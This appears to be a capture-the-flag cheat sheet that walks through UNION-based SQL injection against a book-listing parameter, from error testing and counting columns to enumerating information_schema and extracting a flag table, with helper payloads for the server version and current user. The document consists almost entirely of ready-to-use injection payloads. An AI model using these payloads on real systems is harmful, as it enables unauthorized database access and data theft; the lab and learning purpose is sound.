# Union - SQL Injection

# 🧩 **UNION-Based SQL Injection — Extraction Template**

## **Target Info**

- **URL:**
    
    `<ใส่ URL ของเป้าหมาย>`
    
- **Vulnerable param:**
    
    `id`
    
- **Base query:**
    
    `SELECT * FROM book_list WHERE bookID='<input>'`
    

---

## **1. Test Injection**

```
'<– test for SQL error

```

Result:

`<error/not error>`

---

## **2. Find number of columns**

```
'<input>' order by <n>--+

```

Max column = **<…>**

---

## **3. Find display column (union test)**

```
'<input>' union all select 1,2,3,4,5,6,7,8#

```

Display column = **3**

---

## **4. Extract database()**

```
'<input>' union all select 1,2,(select database()),4,5,6,7,8#

```

Database name = **<database_name>**

---

## **5. List all tables**

```
'<input>' union all select 1,2,
group_concat(table_name),
4,5,6,7,8
from information_schema.tables
where table_schema = database()#

```

Tables found:

- **book_list**
- **flag**
- `<...>`

---

## **6. List columns in target table**

Table: **flag**

```
'<input>' union all select 1,2,
group_concat(column_name),
4,5,6,7,8
from information_schema.columns
where table_name='flag'#

```

Columns:

- **id**
- **flag_value**

---

## **7. Extract FLAG**

```
'<input>' union all select 1,2,
(select flag_value from flag limit 0,1),
4,5,6,7,8#

```

### 🎉 **FLAG = `<paste the flag here>`**

---

# 🧩 **Optional Helper Commands**

### Show server version

```
'<input>' union all select 1,2,@@version,4,5,6,7,8#

```

### Show current user

```
'<input>' union all select 1,2,user(),4,5,6,7,8#

```

### Dump entire flag table (if multiple rows)

```
'<input>' union all select 1,2,
group_concat(flag_value separator 0x0a),
4,5,6,7,8
from flag#

```